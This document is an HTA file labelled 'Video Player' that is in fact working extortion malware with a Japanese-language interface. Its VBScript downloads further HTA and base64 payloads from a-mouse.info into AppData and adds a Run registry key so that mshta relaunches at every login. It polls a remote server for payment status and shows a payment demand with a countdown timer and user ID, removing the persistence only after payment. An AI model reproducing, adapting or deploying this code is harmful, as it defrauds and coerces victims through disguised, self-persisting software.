<HTML>
<HEAD>
<SCRIPT LANGUAGE="VBScript">
Const ID = "M6DHLMUY"
Const PREFIX = "6"
Const FIN_DT = 1296218517
window.moveTo 0, 0
window.resizeTo 1, 1
</SCRIPT>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8">
<TITLE>Video Player</TITLE>
<HTA:APPLICATION ID="VP" APPLICATIONNAME="VP1" BORDER="none" INNERBORDER="no" SCROLL="no" CONTEXTMENU="no" SHOWINTASKBAR="no" SELECTION="no" SINGLEINSTANCE="no">
<SCRIPT LANGUAGE="VBScript">
Option Explicit

Const BASE_URL = "http://a-mouse.info/"
Const CHECK_URL = "http://a-mouse.info/ctrl.php?c=chkpay&id="

Dim iTimerID

Function GetAppDir
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	On Error Resume Next
	GetAppDir = objShell.SpecialFolders("AppData")
	On Error Goto 0
	Set objShell = Nothing
End Function

Function GetCookie(strName)
	Dim strCookie
	Dim aryCookieData
	Dim i, j
	strCookie = document.cookie
	aryCookieData = split(strCookie, ";")
	j = Ubound(aryCookieData)
	For i = 0 To j
		If left(Trim(aryCookieData(i)), len(strName)) = strName Then
			GetCookie = mid(Trim(aryCookieData(i)), len(strName)+2)
			Exit Function
		End If
	Next
End Function

Function CheckPaid
	Dim objWinHttp
	Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
	objWinHttp.Open "GET", CHECK_URL & ID, False
	On Error Resume Next
	objWinHttp.Send
	If Err.Number = 0 Then
		If objWinHttp.Status = "200" Then
			CheckPaid = objWinHttp.responseText
		Else
			CheckPaid = 0
		End If
	Else
		CheckPaid = 0
	End If
	On Error Goto 0
	Set objWinHttp = Nothing
End Function

Function GetName
	Dim objWinHttp
	Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
	objWinHttp.Open "GET", BASE_URL & "player/" & PREFIX & "/" & ID & "/name.dat", False
	On Error Resume Next
	objWinHttp.Send
	If Err.Number = 0 Then
		If objWinHttp.Status = "200" Then
			GetName = objWinHttp.responseText
		Else
			GetName = ""
		End If
	Else
		GetName = ""
	End If
	On Error Goto 0
	Set objWinHttp = Nothing
End Function

Sub GoDetail
	Dim intStat, objShell
	intStat = CheckPaid

	If intStat = 1 Then
		Set objShell = CreateObject("WScript.Shell")
		On Error Resume Next
		objShell.RegDelete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\za"
		On Error Goto 0
		Set objShell = Nothing

		window.close
	End If
End Sub

Sub UpdateLeftTime
	Dim strTerm
	strTerm = DateAdd("s", FIN_DT + 259200 + 32400, "01/01/1970")
	Dim strLeft
	strLeft = DateDiff("s", Now, strTerm)
	If Int(strLeft) < 0 Then
		strLeft = Mid(strLeft, 2)
		left_head.innerHTML = "&#36229;&#36942;"
	Else
		left_head.innerHTML = "&#12414;&#12391;&#12354;&#12392;"
	End If
	Dim intDay, intHour, intMinute, intSecond
	intDay = Int(strLeft / 86400)
	intHour = Int((strLeft Mod 86400) / 3600)
	intMinute = Int(((strLeft Mod 86400) Mod 3600) / 60)
	intSecond = Int((((strLeft Mod 86400) Mod 3600) Mod 60))
	left_time.innerHTML = intDay & "&#26085;" & intHour & "&#26178;&#38291;" & intMinute & "&#20998;" & intSecond & "&#31186;"
End Sub

Sub GetHTA(strDir)
	Dim objWinHttp
	Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
	objWinHttp.Open "GET", BASE_URL & "player/" & PREFIX & "/" & ID & "/" & ID & ".hta", False
	On Error Resume Next
	objWinHttp.Send
	If Err.Number = 0 Then
		If objWinHttp.Status = "200" Then
			Dim objFSO
			Set objFSO = CreateObject("Scripting.FileSystemObject")
			If Not objFSO.FolderExists(strDir & "\\" & ID) Then
				objFSO.CreateFolder strDir & "\\" & ID
			End If
			Dim objFile
			Set objFile = objFSO.CreateTextFile(strDir & "\\" & ID & "\\" & ID & ".hta", True)
			If Err.Number = 0 Then
				objFile.Write objWinHttp.responseText
				objFile.Close
			End If
			Set objFSO = Nothing
		End If
	End If
	On Error Goto 0
	Set objWinHttp = Nothing
End Sub

Sub GetIMG(strDir)
	Dim objWinHttp
	Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
	objWinHttp.Open "GET", BASE_URL & "hta/big.b64", False
	On Error Resume Next
	objWinHttp.Send
	If Err.Number = 0 Then
		If objWinHttp.Status = "200" Then
			Dim objFSO
			Set objFSO = CreateObject("Scripting.FileSystemObject")
			If Not objFSO.FolderExists(strDir & "\\" & ID) Then
				objFSO.CreateFolder strDir & "\\" & ID
			End If
			Dim objFile
			Set objFile = objFSO.CreateTextFile(strDir & "\\" & ID & "\\" & ID & ".b64", True)
			If Err.Number = 0 Then
				objFile.Write objWinHttp.responseText
				objFile.Close
			End If
			Set objFSO = Nothing
		End If
	End If
	On Error Goto 0
	Set objWinHttp = Nothing
End Sub

Sub Window_onLoad

	Dim name
	name = GetName

	Dim intStat
	intStat = CheckPaid

	Dim objShell, strURL

	If intStat = 1 Then
		window.moveTo 0, 0
		window.resizeTo 1, 1

		P.style.display = "block"

		Set objShell = CreateObject("WScript.Shell")
		On Error Resume Next
		objShell.RegDelete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\za"
		On Error Goto 0
		Set objShell = Nothing

		strURL = BASE_URL & "p2.htm"
		window.showModalDialog strURL, name, "dialogWidth:750px;dialogHeight:500px;"
		window.close
	Else
		window.resizeTo 750, 500
		window.moveTo (screen.availWidth - document.body.clientWidth) / 2, (screen.availHeight - document.body.clientHeight) / 2
		window.focus

		Dim strAppDir
		strAppDir = GetAppDir

		GetIMG strAppDir
		GetHTA strAppDir

		M.style.display = "block"

		user_id.innerHTML = ID
		fin_date.innerHTML = DateAdd("s", FIN_DT + 32400, "01/01/1970")

		iTimerID = window.setInterval("UpdateLeftTime", 1000)

		Set objShell = CreateObject("WScript.Shell")
		On Error Resume Next
		objShell.RegWrite "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\za", "mshta " & """" & strAppDir & "\" & ID & "\" & ID & ".hta" & """", "REG_SZ"
		On Error Goto 0
		Set objShell = Nothing

		strURL = BASE_URL & "p2.htm"
		window.showModalDialog strURL, name, "dialogWidth:750px;dialogHeight:500px;"
	End If
End Sub
</SCRIPT>
<STYLE TYPE="text/css">
body {
	margin: 0;
}
body,td,th {
	font-size: 16px;
	color: #FFFFFF;
}
</STYLE>
</HEAD>
<BODY STYLE="background:transparent;">
<DIV ID="P" STYLE="display:none;"></DIV>
<DIV ID="M" STYLE="display:none;">
<TABLE WIDTH="750" BORDER="0" CELLPADDING="0" CELLSPACING="0" BGCOLOR="#FF0000">
	<TR>
		<TD COLSPAN="4"><IMG SRC="http://a-mouse.info/hta/big.gif" WIDTH="750" HEIGHT="425" BORDER="0" USEMAP="#Map"></TD>
	</TR>
	<TR>
		<TD WIDTH="25%">&#12518;&#12540;&#12470;ID</TD>
		<TD WIDTH="25%" ID="user_id"></TD>
		<TD WIDTH="25%">&#12372;&#30331;&#37682;&#26085;&#26178;</TD>
		<TD WIDTH="25%" ID="fin_date"></TD>
	</TR>
	<TR>
		<TD COLSPAN="2"><FONT SIZE="+2">&#12362;&#25391;&#36796;&#12415;&#26399;&#26085;<SPAN ID="left_head"></SPAN></FONT></TD>
		<TD COLSPAN="2"><FONT SIZE="+2"><SPAN ID="left_time"></SPAN></FONT></TD>
	</TR>
	<TR>
		<TD COLSPAN="4">&#26082;&#12395;&#12372;&#20837;&#37329;&#28168;&#12415;&#12391;&#12371;&#12398;&#30011;&#38754;&#12364;&#34920;&#31034;&#12373;&#12428;&#12427;&#22580;&#21512;&#12399;&#12362;&#25163;&#25968;&#12391;&#12377;&#12364;&#12469;&#12509;&#12540;&#12488;&#12480;&#12452;&#12516;&#12523;&#12414;&#12391;&#12372;&#36899;&#32097;&#19979;&#12373;&#12356;&#12290;</TD>
	</TR>
</TABLE>

<MAP NAME="Map" ID="Map"><AREA SHAPE="rect" COORDS="36,350,384,405" HREF="http://a-mouse.info/ctrl.php?c=pay&id=M6DHLMUY" onclick="GoDetail()"></MAP>
</DIV>
</BODY>
</HTML>
